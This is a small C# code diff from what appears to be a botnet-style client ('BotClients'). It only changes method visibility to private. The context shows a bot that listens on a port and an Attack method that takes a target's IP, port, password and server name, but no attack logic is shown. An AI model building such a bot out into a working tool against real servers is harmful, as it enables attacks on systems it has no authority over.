@@ -24,7 +24,7 @@ namespace BotClients
 			throw new Exception("No network adapters with an IPv4 address in the system!");
 		}
 
-		public static void Main(string[] args)
+		private static void Main(string[] args)
 		{
 			///int port2 = ((IPEndPoint)client.Client.LocalEndPoint).Port;
 			Console.WriteLine("Bot is listening on port " + port_);
@@ -66,7 +66,7 @@ namespace BotClients
 			}
 		}
 
-		public static void Attack(byte[] ip_to_attack, byte[] port_to_attack, byte[] pass_to_attack, byte[] name_of_server)
+		private static void Attack(byte[] ip_to_attack, byte[] port_to_attack, byte[] pass_to_attack, byte[] name_of_server)
 		{
 
 			while (true)
@@ -107,7 +107,7 @@ namespace BotClients
 			}
 		}
 
-		static int FreeTcpPort()
+		private static int FreeTcpPort()
 		{
 			TcpListener l = new TcpListener(IPAddress.Loopback, 0);
 			l.Start();
